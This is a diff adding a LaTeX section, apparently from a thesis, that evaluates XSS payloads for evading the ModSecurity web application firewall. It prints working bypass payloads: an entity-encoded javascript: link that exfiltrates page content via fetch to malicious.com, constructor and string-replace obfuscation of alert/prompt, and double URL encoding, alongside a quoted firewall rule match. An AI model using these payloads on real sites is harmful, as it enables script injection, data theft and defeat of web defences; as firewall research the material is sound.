@@ -1,0 +1,70 @@
+\subsection{Multi Iteration Evaluation}
+This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of finally blocked requests are referred to in attachment.
+
+
+Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
+\begin{lstlisting}[style=basicStyle]
+<a href=j&#97v&#97script&#x3A;
+var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
+var&#32data&#32=&#32&#123body:secret,method:'POST'\};
+fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
+\end{lstlisting}
+
+\begin{itemize}
+	\item Using function constructor to evade eval() detection
+	\item supplying the argument via tagged template literal to avoid () characters
+	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
+	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
+\end{itemize}
+
+theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection
+
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
+\end{lstlisting}
+
+
+tried to encode the  payload:
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
+\end{lstlisting}
+with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO
+
+weird unicode: tried using
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
+
+but result is
+
+{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
+
+tried using \u0000 - \u0009, \u2028, \u2029 but that makes the payload invalid. would work in the case when some characters are filtered first by the application, like linebreaks
+\end{lstlisting}
+
+in contrary to not using \verb|()|, a payload thats not using any \verb|{}| but still allows for tagged template literals or other usages of \verb|{}| can be created using string replace. the example payload in Listing~\ref{lst:stringreplaceblocked} is being blocked by the modsecurity firewall:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} example, label={lst:stringreplaceblocked}]
+<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${2 2}"</MatchedData>
+\end{lstlisting}
+
+if one uses a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
+
+\begin{lstlisting}[style=basicStyle, caption=string replace to evade {} detection, label={lst:stringreplacepass}]
+[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
+\end{lstlisting}
+
+successfully evades the firewall.
+
+
+
+on usage of double url encoding (see Listing~\ref{lst:doubleurlencodedexample}), the above mentioned rule with message \quotes{Remote Command Execution: Unix Shell Expression Found} does no longer trigger. the characters \verb|alert(| still trigger \quotes{Javascript Method detected}. substituting \verb|alert()| with \verb|prompt()| and using a tagged template literal instead of calling with \verb|()| will allow to successfully pass a payload that evades detection and is able to display the template parameter. however, this payload would not be valid unless the target performs multiple step url decoding.
+
+\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doubleurlencodedexample}]
+encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)'))
+=
+alert(%2560%2524%257Bnew%2520Date()%257D%2560)
+\end{lstlisting}
